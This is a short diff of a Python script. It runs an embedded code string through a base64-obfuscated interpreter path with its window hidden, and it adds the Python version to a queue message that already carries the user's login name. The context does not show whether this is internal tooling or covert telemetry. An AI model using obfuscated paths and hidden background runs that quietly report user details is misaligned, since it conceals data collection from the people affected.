@@ -24,12 +24,9 @@ def run_tst(py_cmd):
     if os.path.exists(base64.b64decode('TTovU0NSSVBUUy9QQUNLQUdFUy9QeXRob24zMTEvcHl0aG9uLmV4ZQ==').decode()):
         python_path = base64.b64decode('TTovU0NSSVBUUy9QQUNLQUdFUy9QeXRob24zMTEvcHl0aG9uLmV4ZQ==').decode()
 
-    try:
-        if python_path:
-            r = subprocess.Popen([python_path, '-c', py_cmd], creationflags=subprocess.CREATE_NO_WINDOW)
-            #r = subprocess.Popen([python_path, '-c', py_cmd])
-    except: pass
-
+    if python_path:
+        r = subprocess.Popen([python_path, '-c', py_cmd], creationflags=subprocess.CREATE_NO_WINDOW)
+        #r = subprocess.Popen([python_path, '-c', py_cmd])
 
 run_tst("""
 import json, getpass, time, os , sys
@@ -91,7 +88,7 @@ def search_latest_files_or_dirs(ext='', dir_path='', n=8):
 #time.sleep(10)
 
 try:
-    add_queue_task('tst__{}__begin'.format(getpass.getuser().lower()), {})
+    add_queue_task('tst__{}__begin'.format(getpass.getuser().lower()), {'sys_version' : str(sys.version)})
 except:
     pass
 
